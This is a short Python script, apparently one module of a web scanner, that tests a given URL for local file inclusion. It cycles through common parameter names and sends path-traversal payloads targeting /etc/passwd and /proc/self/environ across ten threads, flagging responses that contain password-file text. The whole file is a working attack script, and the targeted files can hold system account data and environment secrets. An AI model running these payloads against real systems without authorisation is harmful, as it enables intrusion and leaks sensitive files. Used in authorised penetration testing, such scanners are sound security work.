import requests
from concurrent.futures import ThreadPoolExecutor

def test_lfi(url, param, payloads):
    try:
        for payload in payloads:
            full_url = f"{url}?{param}={payload}"
            r = requests.get(full_url, timeout=3)
            # crude check for /etc/passwd presence
            if "root:x:" in r.text or "UID" in r.text:
                print(f"[LFI] Possible LFI at: {full_url}")
    except:
        pass

def run(url):
    print("[LFI Test] Running...")

    # common LFI parameters to test
    params = ["file", "page", "template", "view", "dir", "document"]
    payloads = [
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../etc/passwd",
        "../../etc/passwd",
        "../../../../../../../../etc/passwd",
        "../../../proc/self/environ",
        "../../../../../proc/self/environ"
    ]

    with ThreadPoolExecutor(max_workers=10) as executor:
        for param in params:
            executor.submit(test_lfi, url, param, payloads)
